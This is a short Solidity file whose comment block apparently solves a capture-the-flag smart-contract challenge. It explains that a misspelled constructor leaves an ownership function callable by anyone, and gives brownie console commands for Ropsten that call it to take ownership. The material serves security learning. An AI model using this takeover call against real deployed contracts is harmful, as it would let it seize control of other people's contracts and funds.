/* 

in this challenge we notice that the constructor is mispelled and hence it is a regular function that can be called
after contract creation.


# Open brownie console with ropsten testnet

brownie console --network ropsten

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# solution

call = interface.AssumeOwnershipChallenge("contractAddress")

call.AssumeOwmershipChallenge({'from':a[0]})


*/

pragma solidity 0.8.6;

interface AssumeOwnershipChallenge {
    
function AssumeOwmershipChallenge() external;

}